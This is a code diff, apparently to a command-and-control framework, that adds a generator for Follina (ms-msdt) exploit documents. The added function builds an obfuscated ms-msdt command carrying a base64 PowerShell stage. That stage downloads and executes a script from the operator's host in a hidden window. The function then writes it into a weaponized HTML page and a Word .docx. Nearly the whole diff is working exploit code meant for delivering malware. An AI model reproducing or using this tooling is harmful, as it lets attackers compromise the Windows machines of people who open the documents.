@@ -3,6 +3,9 @@ from rich.console import Console
 
 from core import config
 from core.config import *
+import shutil
+import os
+from pathlib import Path
 
 console = Console()
 
@@ -249,6 +252,55 @@ def log_oneliners():
     file.close()
 
 
+def Follina():
+    f = open("core/agents/Follina.Ninja", "r")
+    template = f.read()
+    f.close()
+    command="""ms-msdt:/id PCWDiagnostic /skip force /param \\\"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{Base64}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\\\""""
+    payload = "$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString('{HTTP}://{ip}:{port}{raw}');IEX($s)"
+    commandP = 'Start-Process powershell -ArgumentList "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\'{payload}\')))" -WindowStyle Hidden'
+    if SSL:
+        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload).replace("{HTTP}", "https")
+    else:
+        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{raw}",raw_payload).replace("{HTTP}", "http")
+    payload=base64.b64encode(bytearray(payload, "UTF-8"))
+    PROCESS = commandP.replace('{payload}', payload.decode("UTF-8"))
+    PROCESS=base64.b64encode(bytearray(PROCESS, "UTF-8"))
+    command=command.replace("{Base64}", PROCESS.decode("UTF-8"))
+    template=template.replace("{payload}",command)
+    out = open("utils/payloads/Follina/follina.html", "w")
+    out.write(template)
+    out.close()
+    if Path('utils/payloads/Follina/Follinadoc').is_dir():
+        """#
+        CC = ''
+        while len(CC) == 0:
+            CC = console.input('[cyan][-] Need to Remove old Follina template Folder in utils/payloads/Follina/Follinadoc , press Y if you want to continue[cyan] [green](Y/N)[/green]: ')
+            if CC != "Y":
+                return
+        """
+        shutil.rmtree('utils/payloads/Follina/Follinadoc')
+    if Path('utils/payloads/Follina/Follinadoc.docx').is_file():
+        os.remove('utils/payloads/Follina/Follinadoc.docx')
+        #print ("old Follina Folder Removed")
+        console.log("[red][+] Old Follina Folder Removed[/red]")
+    shutil.copytree("core/agents/Follina-2", "utils/payloads/Follina/Follinadoc")
+    console.log("[green][+] Follina HTML Payload written to:[/green]  [magenta]utils/payloads/Follina/follina.html[/magenta]")
+    f = open("utils/payloads/Follina/Follinadoc/word/_rels/document.xml.rels", "r")
+    payload = f.read()
+    payload=payload.replace("{payload}",command)
+    #follina_url
+    if SSL:
+        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{follina_url}",follina_url+".html").replace("{HTTP}", "https")
+    else:
+        payload = payload.replace('{ip}', config.HOST).replace('{port}', config.PORT).replace("{follina_url}",follina_url+".html").replace("{HTTP}", "http")
+    f.close()
+    f = open("utils/payloads/Follina/Follinadoc/word/_rels/document.xml.rels", "w")
+    f.write(payload)
+    f.close()
+    shutil.make_archive("utils/payloads/Follina/Follinadoc.docx", 'zip', "utils/payloads/Follina/Follinadoc/")
+    os.rename('utils/payloads/Follina/Follinadoc.docx.zip', 'utils/payloads/Follina/Follinadoc.docx')
+    console.log("[green][+] Follina Document Payload written to:[/green]  [magenta]utils/payloads/Follina/Follinadoc.docx[/magenta]")
 
 
 def Create_Payloads():
@@ -265,6 +317,7 @@ def Create_Payloads():
         word_macro()
         excel_macro()
         log_oneliners()
+        Follina()
         if not config.Donut:
             console.log("[!] Donut is Disabled so if you want to use it, kindly create a new campaign", style="bold red")
         else:
